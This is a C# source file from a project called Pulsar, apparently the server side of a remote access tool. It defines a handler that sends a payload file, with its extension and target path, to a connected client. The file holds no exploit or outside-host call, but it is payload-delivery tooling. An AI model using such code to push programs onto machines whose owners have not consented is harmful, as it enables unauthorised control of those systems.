using Pulsar.Common.Messages;
using Pulsar.Common.Models;
using Pulsar.Common.Networking;
using Pulsar.Server.Networking;
using System;
using System.Collections.Generic;
using System.IO.Compression;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Security.Cryptography;
using System.Windows.Forms;
using Pulsar.Common.Messages.Other;
namespace Pulsar.Server.Messages
{

    public class PayloadLoaderHandler : MessageProcessorBase<object>
    {

        private readonly Client _client;


        public delegate void RetrievedMessageHandler(object sender, string Message);

        public event RetrievedMessageHandler PacketsRetrieved;


   
        public PayloadLoaderHandler(Client clients) : base(true)
        {
            _client = clients;
        }
        public override bool CanExecute(IMessage message) => message is null;
        public override bool CanExecuteFrom(ISender sender) => _client.Equals(sender);
        public override void Execute(ISender sender, IMessage message)
        {
           
        }
        public void SendPayloadData(string Extension, string Path, byte[] Payload, string paths)
        {
            var request = new DoSendPayload { Extension = Extension, Path = Path, Payload = Payload, Paths = paths };
            _client.Send(request);  
        }
     
    }
}
